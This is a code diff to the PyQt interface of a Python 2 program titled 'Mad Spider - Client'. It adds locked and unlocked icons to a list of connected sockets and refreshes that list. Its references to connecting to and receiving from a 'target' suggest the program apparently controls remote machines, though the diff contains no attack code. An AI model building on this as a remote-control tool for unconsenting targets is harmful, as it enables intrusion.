@@ -229,8 +229,13 @@ class MainDialog(QWidget, gui.Ui_Form):
     def socketListUpdate(self):
         self.socketsList.clear()
         for __sock__ in self.sockItems:
-            row = QListWidgetItem(' %s ' % str(__sock__))
-            row.setIcon(QIcon(r'assets/tick.png'))
+            row = QListWidgetItem(' %s ' % __sock__[0])
+            if __sock__ in self.unlockedSocks:
+                row.setIcon(QIcon(r'assets/unlocked.png'))
+                print 'unlocked'
+            else:
+                row.setIcon(QIcon(r'assets/tick.png'))
+                print 'locked'
             self.socketsList.addItem(row)
             self.clientscountLabel.setText(str(self.socketsList.count()))
 
@@ -279,6 +284,7 @@ class MainDialog(QWidget, gui.Ui_Form):
                         self.setWindowTitle('Mad Spider - Client - Connected to %s' % str(self.sockItems[self.sockind]))
                         self.tabWidget.setEnabled(True)
                         self.unlockedSocks.append(self.sockItems[self.sockind])
+                        self.socketListUpdate()
                         break
             except socket.error:
                 self.statusno('Error while recieve message from target', self.lineno())
